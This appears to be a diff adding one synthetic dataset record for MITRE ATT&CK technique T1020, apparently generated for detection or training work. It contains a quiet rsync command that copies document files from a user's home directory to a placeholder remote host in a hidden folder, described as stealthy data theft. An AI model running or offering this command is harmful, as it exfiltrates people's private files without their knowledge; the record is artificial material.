@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "rsync -azq --prune-empty-dirs --include='*/' --include='*.pdf' --include='*.docx' --include='*.xlsx' --exclude='*' $HOME/ backup@assets.example.org:.cache/.docs/$HOSTNAME/",
+  "explanation": "Filters and exfiltrates only common document types from the user home directory using rsync\u2019s include/exclude logic to automate selective data theft (T1020).",
+  "rationale_steps": [
+    "Scope data to high-value file types.",
+    "Use include/exclude patterns to avoid unnecessary files.",
+    "Prune empty directories to reduce noise.",
+    "Quiet, compressed sync to stealthily transfer data."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-d10cd1e2-aca6d719",
+  "source_prompt_hash": "d10cd1e2",
+  "timestamp_utc": "2025-09-30T09:04:44.050324Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
